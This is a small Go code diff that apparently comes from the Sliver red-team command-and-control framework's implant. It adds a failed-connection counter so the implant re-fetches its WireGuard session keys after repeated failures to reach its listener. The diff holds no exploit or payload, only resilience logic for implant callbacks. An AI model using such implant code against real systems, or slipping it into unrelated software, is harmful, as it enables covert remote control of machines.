@@ -63,6 +63,7 @@ var (
 	wgSessPubKey  string
 
 	PingInterval = 2 * time.Minute
+	failedConn   = 0
 )
 
 // GetTNet - Get the netstack Net object
@@ -195,13 +196,14 @@ func getSessKeys(address string, port uint16) error {
 
 // WGConnect - Get a wg connection or die trying
 func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
-	if wgSessPrivKey == "" {
+	if wgSessPrivKey == "" || failedConn > 2 {
 		getSessKeys(address, port)
 	}
 
 	// Bring up actual wireguard connection using retrieved keys and IP
 	_, dev, tNet, err := bringUpWGInterface(address, port, wgSessPrivKey, wgSessPubKey, tunAddress)
 	if err != nil {
+		failedConn++
 		return nil, nil, err
 	}
 
@@ -210,12 +212,14 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 		// {{if .Config.Debug}}
 		log.Printf("Unable to connect to sliver listener: %v", err)
 		// {{end}}
+		failedConn++
 		return nil, nil, err
 	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Successfully connected to sliver listener")
 	// {{end}}
+	failedConn = 0
 	tunnelNet = tNet
 	return connection, dev, nil
 }
